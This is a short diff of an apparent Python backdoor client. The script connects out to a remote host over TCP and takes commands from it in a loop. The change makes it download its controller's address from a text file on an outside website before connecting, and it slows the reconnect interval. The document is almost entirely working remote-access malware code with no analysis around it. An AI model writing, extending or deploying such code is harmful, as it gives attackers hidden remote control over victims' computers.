@@ -1,10 +1,16 @@
-import socket, subprocess, sys, os, time
-from _winreg import *
+import socket, subprocess, sys, os, time, urllib
+import xml.dom.minidom
 
-# host = " 90.18.76.18"
-host = "localhost"
+
+URL="https://frompixel.com/recept/test.txt"
+resultat = urllib.urlopen(URL).read()
+print resultat
+host = resultat
+# host = "localhost"
 port = 1122
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+
 def recevCommand():
     while True:
         commande =  sock.recv(4096)
@@ -31,5 +37,5 @@ def Connect():
 def Main ():
     while True:
         Connect()
-        time.sleep(1)
+        time.sleep(5)
 Main()
